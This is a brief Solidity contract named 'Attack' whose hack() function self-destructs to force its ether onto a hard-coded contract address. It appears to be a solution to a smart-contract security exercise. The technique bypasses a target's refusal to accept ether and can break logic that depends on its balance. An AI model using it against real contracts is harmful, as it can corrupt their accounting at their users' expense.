pragma solidity ^0.4.18;

contract Attack {
    address instance_address = 0x489457718ffbdc1721938ac411a27a74fa31a85c;

    function Attack() payable{}
    function hack() public {
        selfdestruct(instance_address);
    }
}